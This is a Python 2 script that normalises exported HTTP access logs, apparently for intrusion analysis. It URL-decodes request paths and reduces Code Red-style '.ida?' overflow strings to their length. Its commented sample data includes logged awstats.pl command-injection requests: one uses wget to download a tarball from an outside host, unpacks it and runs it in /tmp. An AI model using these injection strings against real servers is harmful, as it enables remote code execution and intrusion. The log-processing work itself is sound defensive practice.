import re
import csv
from urllib import unquote


file="/home/hduser/Desktop/normailized_log/http_access_export.csv"
# data = ['/cgi bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3bwget%20www%2eadjud%2ego%2ero%2ft%2etgz%3btar%20zxvf%20t%2etgz%3b%2e%2ft%3becho%20e_exp%3b%2500',
# '/cgi bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3bls%20%2dal%3becho%20e_exp%3b%2500']
# data = ['212.203.66.69', 'Feb 26', '22:12:22', '500', 'GET', '/cgi bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3bls%20%2dal%3becho%20e_exp%3b%2500', 'HTTP/1.1', '200', '961']
def main():
	with open(file, 'rb') as f:
	    reader = csv.reader(f)
	    datalist = map(tuple, reader)
	    
	    dataset = []
	    for sublist in datalist:
	        # sublist = map(lambda item: item.strip(''), sublist)
	        datalist = [i.split(';') for i in sublist][0]
	        # datalist = [x.strip('"') for x in datalist]
	        if'.ida?' in datalist[5]:
	        	spot = datalist[5].index('?')
	        	buffer_len = str(len(datalist[5]) - spot)
	        	item = datalist[5].split('?')[0] + '?' + '[buffer_len]=' + buffer_len
	        else:
		        item5 = unquote(datalist[5])
		        item = unquote(item5)
	        datalist = map(lambda x: x if datalist.index(x) != 5 else item, datalist)
	        # print datalist 
	      	dataset.append(datalist)

    	return dataset

if __name__ == "__main__":
    dataset = main()
    print dataset

csvfile ="/home/hduser/Desktop/normailized_log/http_access_import.csv"
with open(csvfile, "w") as output:
    writer = csv.writer(output, lineterminator='\n')
    for alist in dataset:
        writer.writerow(alist) 
print "successully exported to csv!"